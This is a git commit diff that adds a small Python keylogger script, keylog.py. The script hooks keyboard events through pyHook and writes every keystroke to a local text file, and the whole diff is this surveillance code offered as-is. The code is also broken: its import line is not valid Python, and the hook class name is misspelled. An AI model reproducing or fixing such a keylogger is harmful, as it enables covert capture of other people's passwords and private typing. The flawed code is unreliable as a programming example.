df803f6a40ca785cf39d002c9ac5e1329331856a
Blawle <44331563+Blawle@users.noreply.github.com>
2018-10-28 20:13:45 -0400

    Update keylog.py

--- keylog.py
+++ keylog.py
@@ -1,1 +1,27 @@
-import 
+import pythoncom, import pyHook
+
+def keypressed(event):
+    global store
+
+    if event.Ascii == 13:
+        keys = ' < ENTER >'
+    elif event.Ascii == 8:
+        keys = ' < BACK SPACE > '
+    else:
+        keys = chr(event.Ascii)
+
+    store = store + keys
+
+    fp = open("keylogs.txt", "w")
+    fp.write(store)
+    print(store)
+    fp.close()
+
+    return True
+
+store = ''
+obj = pyHook.HookManger()
+obj.KeyDown = keypressed
+
+obj.HookKeyboard()
+pythoncom.PumpMessages()
